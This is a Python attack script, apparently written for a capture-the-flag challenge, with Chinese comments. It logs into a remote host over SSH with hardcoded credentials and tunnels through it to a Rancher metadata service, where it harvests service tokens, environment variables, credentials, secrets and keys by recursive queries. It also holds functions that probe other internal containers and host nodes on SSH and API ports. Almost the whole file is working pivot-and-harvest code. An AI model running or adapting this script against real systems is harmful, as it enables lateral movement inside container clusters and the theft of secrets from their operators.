import paramiko
import socket
import time
import sys

"""
找到的verygoodssh容器IP:
- 10.42.220.13
- 10.42.88.233
- 10.42.111.62
- 10.42.3.30
- 10.42.169.44
- 10.42.227.103

这些是Rancher内部网络的IP

另外，主机agent_ip:
- rancher-node2: 10.30.49.12
- rancher-node4: 10.30.49.14
- rancher-node1: 10.30.49.11

让我尝试：
1. 连接其他verygoodssh容器
2. 连接主机
3. 查找可能的凭据或flag

关键发现：/latest/self/service/token 可能有token！
"""

HOST = "61.147.171.105"
PORT = 55300
USER = "ctf"
PASSWD = "123456"

def http_get(transport, host, port, path):
    """发送HTTP GET请求"""
    try:
        channel = transport.open_channel("direct-tcpip", (host, port), ('127.0.0.1', 0), timeout=5)
        channel.settimeout(5)
        
        request = f"GET {path} HTTP/1.0\r\nHost: {host}\r\n\r\n"
        channel.send(request.encode())
        
        time.sleep(0.5)
        response = b""
        while True:
            try:
                chunk = channel.recv(4096)
                if not chunk:
                    break
                response += chunk
            except:
                break
        
        channel.close()
        
        # 解析HTTP响应
        response_text = response.decode()
        if "\r\n\r\n" in response_text:
            body = response_text.split("\r\n\r\n", 1)[1]
            return body
        return response_text
    except Exception as e:
        return f"Error: {e}"

def get_service_token():
    """获取服务token"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 获取服务token和其他敏感信息")
    
    paths = [
        "/latest/self/service/token",
        "/latest/self/service/uuid",
        "/latest/self/container/external_id",
        "/latest/self/container/network_uuid",
        "/latest/self/container/uuid",
        "/latest/self/host/",
    ]
    
    for path in paths:
        result = http_get(transport, "172.17.0.2", 80, path)
        if result and "Error" not in result and "Not found" not in result:
            print(f"\n{path}:")
            print(result)
    
    ssh.close()

def try_connect_other_containers():
    """尝试连接其他容器"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("\n[*] 尝试连接其他verygoodssh容器")
    
    container_ips = [
        "10.42.220.13",
        "10.42.88.233", 
        "10.42.111.62",
        "10.42.3.30",
        "10.42.169.44",
        "10.42.227.103",
    ]
    
    for ip in container_ips:
        print(f"\n=== 尝试 {ip} ===")
        
        # 尝试SSH端口
        try:
            channel = transport.open_channel("direct-tcpip", (ip, 22), ('127.0.0.1', 0), timeout=3)
            channel.settimeout(3)
            banner = channel.recv(1024)
            print(f"SSH banner: {banner}")
            channel.close()
        except Exception as e:
            print(f"SSH: {e}")
        
        # 尝试HTTP端口
        try:
            channel = transport.open_channel("direct-tcpip", (ip, 80), ('127.0.0.1', 0), timeout=3)
            channel.settimeout(3)
            channel.send(b"GET / HTTP/1.0\r\n\r\n")
            time.sleep(0.5)
            response = channel.recv(1024)
            print(f"HTTP: {response[:200]}")
            channel.close()
        except Exception as e:
            print(f"HTTP: {e}")
    
    ssh.close()

def try_connect_host_agents():
    """尝试连接主机agent"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("\n[*] 尝试连接主机agent")
    
    host_ips = [
        "10.30.49.11",  # rancher-node1
        "10.30.49.12",  # rancher-node2
        "10.30.49.14",  # rancher-node4
    ]
    
    for ip in host_ips:
        print(f"\n=== 主机 {ip} ===")
        
        # 尝试SSH
        try:
            channel = transport.open_channel("direct-tcpip", (ip, 22), ('127.0.0.1', 0), timeout=3)
            channel.settimeout(3)
            banner = channel.recv(1024)
            print(f"SSH: {banner}")
            channel.close()
        except Exception as e:
            print(f"SSH: {e}")
        
        # 尝试Rancher API端口 (通常8080)
        try:
            channel = transport.open_channel("direct-tcpip", (ip, 8080), ('127.0.0.1', 0), timeout=3)
            channel.settimeout(3)
            channel.send(b"GET / HTTP/1.0\r\n\r\n")
            time.sleep(0.5)
            response = channel.recv(1024)
            print(f"8080: {response[:200]}")
            channel.close()
        except Exception as e:
            print(f"8080: {e}")
    
    ssh.close()

def explore_sensitive_paths():
    """探索敏感路径"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("\n[*] 探索敏感路径")
    
    # 尝试各种可能有敏感信息的路径
    paths = [
        # 环境变量
        "/latest/self/container/environment/",
        "/latest/self/stack/environment_name",
        "/latest/environments/",
        
        # Token和认证
        "/latest/self/service/token",
        "/latest/self/container/token",
        
        # 标签可能含有信息
        "/latest/self/container/labels/",
        "/latest/self/service/labels/",
        
        # 网络信息
        "/latest/networks/4/",  # ipsec网络
        
        # 其他可能的路径
        "/latest/credentials/",
        "/latest/secrets/",
        "/latest/keys/",
        "/latest/auth/",
        
        # 直接尝试flag
        "/flag",
        "/latest/flag",
    ]
    
    for path in paths:
        result = http_get(transport, "172.17.0.2", 80, path)
        if result and "Error" not in result:
            result_clean = result.strip()
            if result_clean and "Not found" not in result_clean:
                print(f"\n{path}:")
                print(result_clean[:500])
    
    ssh.close()

def explore_all_services_metadata():
    """探索所有服务的metadata"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("\n[*] 探索所有服务的metadata")
    
    # 先找到very_good_ssh服务
    result = http_get(transport, "172.17.0.2", 80, "/latest/services/")
    lines = result.strip().split("\n")
    
    for line in lines:
        parts = line.split("=")
        if len(parts) == 2:
            index = parts[0]
            name = parts[1]
            
            # 获取服务的metadata
            meta_result = http_get(transport, "172.17.0.2", 80, f"/latest/services/{index}/metadata/")
            if meta_result and "Error" not in meta_result and "Not found" not in meta_result:
                meta_clean = meta_result.strip()
                if meta_clean and meta_clean != "io.rancher.service.hash":
                    print(f"\n服务 {name} metadata:")
                    print(meta_clean[:500])
    
    ssh.close()

def recursive_explore(base_path):
    """递归探索路径"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print(f"\n[*] 递归探索 {base_path}")
    
    def explore(path, depth=0):
        if depth > 3:
            return
        
        result = http_get(transport, "172.17.0.2", 80, path)
        if not result or "Error" in result or "Not found" in result:
            return
        
        lines = result.strip().split("\n")
        for line in lines:
            if line.endswith("/"):
                # 是目录，继续探索
                subpath = path.rstrip("/") + "/" + line
                print(f"{'  '*depth}{subpath}")
                explore(subpath, depth+1)
            else:
                # 是值
                value = http_get(transport, "172.17.0.2", 80, path.rstrip("/") + "/" + line)
                if value and "Not found" not in value and len(value.strip()) < 100:
                    print(f"{'  '*depth}{line}: {value.strip()}")
    
    explore(base_path)
    
    ssh.close()

if __name__ == "__main__":
    print("="*60)
    print("[*] 探索敏感信息")
    print("="*60)
    
    get_service_token()
    explore_sensitive_paths()
    #try_connect_other_containers()
    #try_connect_host_agents()
    
    print("\n" + "="*60)
    print("[*] 递归探索self/container")
    print("="*60)
    recursive_explore("/latest/self/container/")
